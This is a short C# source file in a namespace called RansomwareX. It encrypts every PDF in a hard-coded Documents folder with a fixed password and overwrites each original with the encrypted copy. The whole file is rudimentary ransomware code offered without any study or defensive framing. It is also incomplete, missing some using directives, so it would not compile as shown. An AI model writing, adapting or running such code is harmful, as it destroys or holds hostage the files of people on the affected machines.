using System;
using SharpAESCrypt;

namespace RansomwareX
{
    class Program
    {
        static void Main(string[] args)
        {
            string dir = @"C:\Users\123\Documents\Tes";
            List<string> files = new List<string>();
            DirectoryInfo d = new DirectoryInfo(dir);

            foreach (var file in d.GetFiles("*.pdf"))
            {
                files.Add(file.ToString());
            }

            foreach (string file in files)
            {
                string encrypted_file = dir + "encrypted_file.pdf";
                SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encrypted_file);
                File.Delete(file);
                File.Move(encrypted_file, file);

            }
        }
    }
}